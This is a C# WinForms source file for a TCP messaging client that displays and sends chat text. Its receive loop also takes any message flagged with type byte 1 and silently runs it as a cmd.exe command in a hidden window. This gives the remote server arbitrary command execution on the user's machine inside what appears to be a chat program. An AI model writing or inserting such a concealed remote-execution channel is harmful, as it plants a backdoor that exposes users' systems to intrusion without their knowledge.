using ForTCP;
using System;
using System.Diagnostics;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Client
{
    public partial class ClientForm : Form
    {
        TCPClient tCPClient;
        delegate void getString(string kk);
        public ClientForm()
        {
            CheckForIllegalCrossThreadCalls = false;
            InitializeComponent();
        }

        private void BTConnect_Click(object sender, EventArgs e)
        {
            tCPClient = new TCPClient(tBHost.Text.Trim(), int.Parse(tBPort.Text.Trim()));
            if (tCPClient.startClient())
            {
                Thread th_receive = new Thread(Receive);
                th_receive.IsBackground = true;
                th_receive.Start();
                rTBMSG.Text += "连接成功\n";
            }
            else
            {
                rTBMSG.Text += "连接失败\n";
            }
        }

        private void Receive()
        {
            while (true)
            {
                byte[] receivedByte = tCPClient.receiveData();
                if (receivedByte != null)
                {
                    byte i = receivedByte[0];
                    byte[] buf = new byte[receivedByte.Length - 1];
                    Array.Copy(receivedByte, 1, buf, 0, receivedByte.Length - 1);
                    if (i == 0)
                    {
                        rTBMSG.Text += "已接收>>" + Encoding.UTF8.GetString(buf) + "\n";
                    }
                    else if (i == 1)
                    {
                        //TODO 控制
                        new Thread(doiii).Start(Encoding.UTF8.GetString(buf));
                    }
                }
            }
        }
        public void doiii(object s)
        {
            Execute(s as string, 1000);
        }
        public static string Execute(string command, int seconds)
        {
            string output = ""; //输出字符串  
            if (command != null && !command.Equals(""))
            {
                Process process = new Process();//创建进程对象  
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = "cmd.exe";//设定需要执行的命令  
                startInfo.Arguments = "/C " + command;//“/C”表示执行完命令后马上退出  
                startInfo.UseShellExecute = false;//不使用系统外壳程序启动 
                startInfo.RedirectStandardInput = false;//不重定向输入  
                startInfo.RedirectStandardOutput = true; //重定向输出  
                startInfo.CreateNoWindow = true;//不创建窗口  
                process.StartInfo = startInfo;
                try
                {
                    if (process.Start())//开始进程  
                    {
                        if (seconds == 0)
                        {
                            process.WaitForExit();//这里无限等待进程结束  
                        }
                        else
                        {
                            process.WaitForExit(seconds); //等待进程结束，等待时间为指定的毫秒  
                        }
                        output = process.StandardOutput.ReadToEnd();//读取进程的输出  
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);//捕获异常，输出异常信息
                }
                finally
                {
                    if (process != null)
                        process.Close();
                }
            }
            return output;
        }
        private void BTSend_Click(object sender, EventArgs e)
        {
            byte[] sendBytes = Encoding.UTF8.GetBytes(tBmsg.Text.Trim());
            if (tCPClient.SendData(TCPClient.Md5pwd, sendBytes))
            {
                rTBMSG.Text += "已发送>>" + tBmsg.Text.Trim() + "\n";
                tBmsg.Text = "";
            }
        }

        private void exitEToolStripMenuItem_Click(object sender, EventArgs e)
        {
            tCPClient.stopClient();
            Application.Exit();
        }
    }
}
